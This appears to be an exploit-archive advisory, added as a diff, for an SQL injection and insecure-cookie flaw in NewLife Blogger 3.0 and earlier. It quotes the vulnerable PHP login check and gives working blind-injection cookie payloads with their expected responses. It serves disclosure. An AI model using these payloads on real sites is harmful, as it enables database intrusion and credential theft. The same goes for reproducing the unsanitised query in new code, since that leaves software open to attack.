@@ -1,0 +1,56 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+NewLife Blogger <= v3.0 / Insecure Cookie Handling & SQL Injection Vulnerability 
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+$ Program: NewLife Blogger
+$ Version: <= 3.0
+$ File affected: system/nlb_user.class.php
+$ Download: http://sourceforge.net/projects/nlb/
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org
+
+
+Cookie format is:
+nlb3=7::96e79218965eb72c92a549dd5a330112
+nlb3=iduser::md5 pass
+
+--Bug --
+
+143.	function checkLogin( ) {
+144.		// loing check
+145.		if( isset( $_COOKIE['nlb3'] ) ) {
+146.			$data = explode( '::', $_COOKIE['nlb3'] );
+147.			$id = $data[0];
+148.			$pass = $data[1];
+149.			$fromdb = $this->sql->getArray('SELECT password FROM ' . db_users . ' WHERE user_id = ' . $id . ' LIMIT 1;');
+150.			if( $pass === $fromdb['password'] ) {
+151.				$this->setid( $id );
+152.				$this->isLogedIn = true;
+153.			} else {
+154.				$this->isLogedIn = false;
+155.			}
+156.		}
+157.		// we also check for banned users
+158.		$this->checkBanned();
+159.	}
+
+
+-- Exploit --
+
+True/false method to blind mysql injection. Examples:
+
+javascript:document.cookie = "nlb3=7 and 1=1::96e79218965eb72c92a549dd5a330112"
+Response: You appears as logged in
+
+javascript:document.cookie = "nlb3=7 and 1=0::96e79218965eb72c92a549dd5a330112"
+Response: You appears as not logged in
+
+javascript:document.cookie = "nlb3=7 and (select substring(version(),1,1))=4::96e79218965eb72c92a549dd5a330112
+Response: You appears as logged in if MySQL version is 4
+
+javascript:document.cookie = "nlb3=7 and (select substring(version(),1,1))=5::96e79218965eb72c92a549dd5a330112
+Response: You appears as logged in if MySQL version is 5
+
+# milw0rm.com [2008-10-12]
